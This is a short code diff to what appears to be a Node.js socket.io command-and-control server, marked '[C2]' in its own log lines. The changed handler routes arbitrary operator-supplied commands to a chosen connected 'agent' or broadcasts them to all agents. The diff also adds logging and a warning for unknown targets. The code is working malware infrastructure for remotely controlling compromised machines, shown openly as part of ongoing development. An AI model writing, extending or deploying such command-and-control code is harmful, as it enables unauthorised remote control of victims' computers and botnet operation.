@@ -58,9 +58,16 @@ io.on('connection', (socket) => {
   
   socket.on('exec_cmd', (data) => {
     const { targetId, cmd } = data;
+    console.log('[C2] Routing command:', cmd, 'to', targetId);
+    
     const target = agents.find(a => a.id === targetId);
-    if (target) io.to(target.socketId).emit('command', { cmd });
-    else if (targetId === 'all') agents.forEach(a => io.to(a.socketId).emit('command', { cmd }));
+    if (target) {
+        io.to(target.socketId).emit('command', { cmd });
+    } else if (targetId === 'all') {
+        agents.forEach(a => io.to(a.socketId).emit('command', { cmd }));
+    } else {
+        console.warn('[C2] Target not found:', targetId);
+    }
   });
 
   socket.on('disconnect', () => {
